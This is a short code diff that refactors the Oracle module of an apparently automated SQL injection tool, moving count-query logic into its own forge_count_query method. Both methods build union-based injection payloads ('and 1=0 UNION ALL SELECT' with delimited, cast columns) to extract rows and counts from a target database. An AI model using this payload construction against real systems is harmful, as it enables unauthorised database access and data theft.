@@ -101,14 +101,17 @@ class OracleMole(DbmsMole):
     def to_string(self, data):
         return DbmsMole.chr_join(data)
 
+    def forge_count_query(self, column_count, fields, table_name, injectable_field, where = "1=1"):
+        query = " and 1=0 UNION ALL SELECT "
+        query_list = list(self.query)
+        query_list[injectable_field] = OracleMole.out_delimiter + '||cast(count(*) as varchar2(150))||' + OracleMole.out_delimiter
+        query += ','.join(query_list)
+        query += ' from ' + table_name + ' where ' + self.parse_condition(where)
+        return query
+
     def forge_query(self, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
         query = " and 1=0 UNION ALL SELECT "
         query_list = list(self.query)
-        if re.search('count\([\w*]+\)', fields):
-            query_list[injectable_field] = OracleMole.out_delimiter + '||cast(count(*) as varchar2(150))||' + OracleMole.out_delimiter
-            query += ','.join(query_list)
-            query += ' from ' + table_name + ' where ' + self.parse_condition(where)
-            return query
         fields_splitted = fields.split(',')
         query_list[injectable_field] = ("(" +
                                             OracleMole.out_delimiter +
@@ -127,7 +130,6 @@ class OracleMole(DbmsMole):
     
     def _concat_fields(self, fields):
         return fields
-        #return ('||' + OracleMole.inner_delimiter + '||').join(map(lambda x: 'coalesce(cast(' + x + ' as varchar(150)),CHR(32))', fields))
     
     def _do_concat_fields(self, fields):
         return ('||' + OracleMole.inner_delimiter + '||').join(map(lambda x: 'coalesce(cast(' + x + ' as varchar(150)),CHR(32))', fields))
